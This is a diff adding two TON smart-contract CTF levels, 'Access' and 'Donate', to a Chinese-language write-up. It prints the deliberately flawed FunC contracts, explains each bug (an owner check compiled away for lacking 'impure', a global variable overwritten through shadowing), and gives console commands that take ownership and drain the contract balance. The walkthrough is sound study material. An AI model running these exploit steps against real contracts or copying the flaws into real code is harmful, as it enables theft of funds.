@@ -6,6 +6,7 @@ tags:
     - ton
     - tact
     - tolk
+    - func
 ---
 
 ## 0. INTRODUCTION
@@ -1398,3 +1399,348 @@ tags:
         );
     }
     ```
+
+## 13. ACCESS
+
+> Unlock the contract below to complete this level.
+
+??? note "Access"
+
+    ```c
+    #include "../imports/stdlib.fc";
+
+    const op::unlock = "op::unlock"c; ;; create an opcode from string using the "c" prefix, this results in 0xf0fd50bb opcode in this case
+    const op::change_owner = "op::change_owner"c; ;; create an opcode from string using the "c" prefix, this results in 0xf1eef33c opcode in this case
+    const op::change_nonce = "op::change_nonce"c; ;; create an opcode from string using the "c" prefix, this results in 0x8caa87bd opcode in this case
+
+    ;; storage variables
+
+    global slice ctx_player;
+    global int ctx_nonce;
+    global slice ctx_owner;
+    global int ctx_locked;
+
+    ;; load_data populates storage variables using stored data
+    () load_data() impure {
+        var ds = get_data().begin_parse();
+
+        ctx_player = ds~load_msg_addr();
+        ctx_nonce = ds~load_uint(32);
+        ctx_owner = ds~load_msg_addr();
+        ctx_locked = ds~load_int(1);
+
+        ds.end_parse();
+    }
+
+    ;; save_data stores storage variables as a cell into persistent storage
+    () save_data() impure {
+        set_data(
+            begin_cell()
+                .store_slice(ctx_player)
+                .store_uint(ctx_nonce, 32)
+                .store_slice(ctx_owner)
+                .store_int(ctx_locked, 1)
+            .end_cell()
+        );
+    }
+
+    () check_owner(slice sender) {
+        throw_unless(501, equal_slice_bits(sender, ctx_owner));
+    }
+
+    ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts
+    () recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
+        if (in_msg_body.slice_empty?()) { ;; ignore all empty messages
+            return ();
+        }
+
+        slice cs = in_msg_full.begin_parse();
+        int flags = cs~load_uint(4);
+        if (flags & 1) { ;; ignore all bounced messages
+            return ();
+        }
+        slice sender_address = cs~load_msg_addr();
+
+        load_data(); ;; here we populate the storage variables
+
+        int op = in_msg_body~load_uint(32); ;; by convention, the first 32 bits of incoming message is the op
+
+        ;; receive "check" message
+        if (equal_slice_bits(in_msg_body, "check")) {
+            ;; send CheckLevelResult msg
+            cell msg_body = begin_cell()
+                .store_uint(0x6df37b4d, 32)
+                .store_ref(begin_cell().store_slice("access").end_cell())
+                .store_int(~ ctx_locked, 1)
+            .end_cell();
+            builder msg = begin_cell()
+                .store_uint(0x18, 6)
+                .store_slice(sender_address)
+                .store_coins(0)
+                .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+                .store_ref(msg_body);
+                
+            ;; send all the remaining value
+            send_raw_message(msg.end_cell(), 64);
+            return ();
+        }
+
+        if (op == op::unlock) {
+            ctx_locked = ~ equal_slice_bits(ctx_player, ctx_owner);
+            save_data();
+            return ();
+        }
+
+        if (op == op::change_owner) {
+            check_owner(sender_address);
+            throw_unless(502, ctx_nonce == 9999);
+            ctx_owner = in_msg_body~load_msg_addr();
+            save_data();
+            return ();
+        }
+
+        if (op == op::change_nonce) {
+            ctx_nonce = in_msg_body~load_uint(32);
+            save_data();
+            return ();
+        }
+
+        throw(0xffff); ;; if the message contains an op that is not known to this contract, we throw
+    }
+
+    ;; get methods are a means to conveniently read contract data using, for example, HTTP APIs
+    ;; they are marked with method_id
+    ;; note that unlike in many other smart contract VMs, get methods cannot be called by other contracts
+
+    int nonce() method_id {
+        load_data();
+        return ctx_nonce;
+    }
+
+    slice owner() method_id {
+        load_data();
+        return ctx_owner;
+    }
+
+    int locked() method_id {
+        load_data();
+        return ctx_locked;
+    }
+    ```
+
+- 解锁需要 `ctx_owner` 是 `ctx_player`
+
+    ```c
+    if (op == op::unlock) {
+        ctx_locked = ~ equal_slice_bits(ctx_player, ctx_owner);
+        save_data();
+        return ();
+    }
+    ```
+
+- 操作 `op::change_owner` 调用函数 `check_owner()` 检查调用者是否为 `ctx_owner`，但由于未使用 `impure` 标识符且没有检查函数调用的结果，该函数调用会在编译时被移除
+
+    ```c
+    () check_owner(slice sender) {
+        throw_unless(501, equal_slice_bits(sender, ctx_owner));
+    }
+    ```
+
+- 因此，先修改 `ctx_nonce` 再更新 `ctx_owner`，即可解锁
+
+    ```js
+    > await contract.send(player, beginCell().storeUint(0x8caa87bd, 32).storeUint(9999, 32).endCell(), toNano("0.01"));
+    > await contract.send(player, beginCell().storeUint(0xf1eef33c, 32).storeAddress(player.address).endCell(), toNano("0.01"));
+    > await contract.send(player, beginCell().storeUint(0xf0fd50bb, 32).endCell(), toNano("0.01"));
+    ```
+
+## 14. DONATE
+
+> You will beat this level if you manage to reduce its balance to 0.
+
+??? note "Donate"
+
+    ```c
+    #include "../imports/stdlib.fc";
+
+    const donation_goal = 1000000000;
+    const gas_consumption = 5000000; 
+
+    const op::change_destination = "op::change_destination"c; ;; create an opcode from string using the "c" prefix, this results in 0xbaed25a6 opcode in this case
+    const op::withdraw = "op::withdraw"c; ;; create an opcode from string using the "c" prefix, this results in 0xcb03bfaf opcode in this case
+    const op::donate = "op::donate"c; ;; create an opcode from string using the "c" prefix, this results in 0x47bbe425 opcode in this case
+
+    ;; storage variables
+
+    global slice player;
+    global int nonce;
+    global slice owner;
+    global slice destination;
+    global int donations_count;
+
+    ;; load_data populates storage variables using stored data
+    () load_data() impure {
+        var ds = get_data().begin_parse();
+
+        player = ds~load_msg_addr();
+        nonce = ds~load_uint(32);
+        owner = ds~load_msg_addr();
+        destination = ds~load_msg_addr();
+        donations_count = ds~load_uint(32);
+
+        ds.end_parse();
+    }
+
+    ;; save_data stores storage variables as a cell into persistent storage
+    () save_data() impure {
+        set_data(
+            begin_cell()
+                .store_slice(player)
+                .store_uint(nonce, 32)
+                .store_slice(owner)
+                .store_slice(destination)
+                .store_uint(donations_count, 32)
+            .end_cell()
+        );
+    }
+
+    ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts
+    () recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
+        if (in_msg_body.slice_empty?()) { ;; ignore all empty messages
+            return ();
+        }
+
+        slice cs = in_msg_full.begin_parse();
+        int flags = cs~load_uint(4);
+        if (flags & 1) { ;; ignore all bounced messages
+            return ();
+        }
+        slice sender_address = cs~load_msg_addr();
+
+        load_data(); ;; here we populate the storage variables
+
+        int op = in_msg_body~load_uint(32); ;; by convention, the first 32 bits of incoming message is the op
+
+        ;; receive "check" message
+        if (equal_slice_bits(in_msg_body, "check")) {
+            ;; send CheckLevelResult msg
+            cell msg_body = begin_cell()
+                .store_uint(0x6df37b4d, 32)
+                .store_ref(begin_cell().store_slice("donate").end_cell())
+                .store_int(my_balance - msg_value == 0, 1)
+            .end_cell();
+            builder msg = begin_cell()
+                .store_uint(0x18, 6)
+                .store_slice(sender_address)
+                .store_coins(0)
+                .store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
+                .store_ref(msg_body);
+                
+            ;; send all the remaining value
+            send_raw_message(msg.end_cell(), 64);
+            return ();
+        }
+
+        if (op == op::change_destination) {
+            throw_unless(501, equal_slice_bits(sender_address, owner));
+            var new_destination = in_msg_body~load_msg_addr();
+            destination = new_destination;
+            save_data();
+            return ();
+        }
+
+        if (op == op::withdraw) {
+            throw_unless(502, equal_slice_bits(sender_address, destination));
+            builder msg = begin_cell()
+                .store_uint(0x18, 6)
+                .store_slice(destination)
+                .store_coins(0)
+                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);
+            
+            ;; send all the contract balance
+            send_raw_message(msg.end_cell(), 128);
+            return ();
+        }
+
+        if (op == op::donate) {
+            throw_unless(503, my_balance - msg_value < donation_goal);
+
+            if (my_balance > donation_goal) {
+                var destination = in_msg_body~load_msg_addr();
+                builder msg = begin_cell()
+                    .store_uint(0x18, 6)
+                    .store_slice(destination)
+                    .store_coins(my_balance - donation_goal - gas_consumption)
+                    .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);
+                
+                send_raw_message(msg.end_cell(), 0);
+            }
+
+            donations_count += 1;
+            save_data();
+            return ();
+        }
+
+        throw(0xffff); ;; if the message contains an op that is not known to this contract, we throw
+    }
+
+    ;; get methods are a means to conveniently read contract data using, for example, HTTP APIs
+    ;; they are marked with method_id
+    ;; note that unlike in many other smart contract VMs, get methods cannot be called by other contracts
+
+    slice _owner() method_id {
+        load_data();
+        return owner;
+    }
+
+    slice _destination() method_id {
+        load_data();
+        return destination;
+    }
+
+    int _donations_count() method_id {
+        load_data();
+        return donations_count;
+    }
+
+    int balance() method_id {
+        [int value, _] = get_balance();
+        return value;
+    }
+    ```
+
+- 操作 `op::withdraw` 可以将合约所持有的所有 TON 都发送给调用者 `destination`
+- 修改 `destination` 的操作 `op::change_destination` 只有 `owner` 可以调用
+- 由于全局变量不能被重定义，当合约余额大于 `donation_goal` 时，操作 `op::donate` 实际上更新的是全局变量 `destination`，而不是其定义的本地变量
+
+    ```c
+    if (op == op::donate) {
+        throw_unless(503, my_balance - msg_value < donation_goal);
+
+        if (my_balance > donation_goal) {
+            var destination = in_msg_body~load_msg_addr();
+            builder msg = begin_cell()
+                .store_uint(0x18, 6)
+                .store_slice(destination)
+                .store_coins(my_balance - donation_goal - gas_consumption)
+                .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1);
+            
+            send_raw_message(msg.end_cell(), 0);
+        }
+
+        donations_count += 1;
+        save_data();
+        return ();
+    }
+    ```
+
+- 捐款并设置 `destination`，随后发送 `op::withdraw` 消息
+
+```js
+> await contract.send(player, beginCell().storeUint(0x47bbe425, 32).storeAddress(player.address).endCell(), toNano(1));
+> await contract.send(player, beginCell().storeUint(0xcb03bfaf, 32).endCell(), toNano("0.01"));
+```
+
+### References
+
+- [Variable declaration](https://docs.ton.org/v3/documentation/smart-contracts/func/docs/statements#variable-declaration)
